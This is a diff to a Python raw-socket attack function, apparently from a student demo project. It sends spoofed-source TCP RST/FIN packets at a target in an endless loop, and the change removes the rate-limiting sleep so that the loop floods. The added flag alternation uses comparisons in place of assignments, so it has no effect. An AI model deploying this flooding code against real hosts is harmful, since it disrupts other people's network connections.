@@ -171,13 +171,21 @@ def receivemessage(socket):
 
 def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
     #print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
+    i = 0
     while 1:
+        if attack_type == "RST" and i % 2 == 0:
+            attack_type == "FIN"
+
+        if attack_type == "FIN" and i % 2 != 0:
+            attack_type == "RST"
+
         packet = monta_pacote(0, attack_type, get_random_ip(), dest_ip,
                               randint(1800, 65533), int(dest_port), 5840, 54321)
 
         raw_socket.sendto(packet, (dest_ip, 0))
+        i += 1
         #TODO: retirar esse sleep na apresentacao
-        sleep(1)
+        #sleep(1)
         #print "sending attack"
 
 
